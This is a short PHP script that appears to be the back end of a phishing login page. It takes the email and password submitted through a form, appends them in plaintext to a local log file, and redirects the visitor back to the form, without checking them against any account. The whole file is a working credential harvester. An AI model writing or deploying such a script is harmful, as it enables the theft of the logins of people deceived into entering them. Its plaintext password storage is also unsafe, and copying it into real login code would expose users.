<?php
// Define the log file path
$log_file = 'log.txt';

// Check if the form was submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login_submit'])) {
    // Retrieve email and password from the POST request
    $login_email = $_POST['login_email'];
    $login_password = $_POST['login_password'];

    // Prepare the data to be logged
    $log_data = "Email: " . $login_email . " | Password: " . $login_password . "\n";

    // Append the data to the log file
    file_put_contents($log_file, $log_data, FILE_APPEND);


    // Uncomment the line below to redirect back to the form page
    header("Location: index.php"); 
    // exit;
} else {
    echo "Invalid request.";
}
?>
